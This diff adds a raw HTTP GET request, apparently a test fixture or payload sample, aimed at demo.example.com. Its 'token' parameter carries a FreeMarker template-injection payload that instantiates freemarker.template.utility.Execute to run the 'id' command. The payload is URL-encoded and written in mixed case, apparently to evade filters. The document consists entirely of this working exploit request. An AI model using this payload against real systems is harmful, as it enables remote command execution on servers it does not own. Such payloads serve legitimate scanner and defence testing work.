@@ -1,0 +1,4 @@
+GET /a?token=<%23aSsIgN%20eX%3D"fReEmArKeR.tEmPlAtE.uTiLiTy.ExEcUtE"%3FnEw()>${Ex("Id")} HTTP/1.1
+Host: demo.example.com
+Connection: close
+
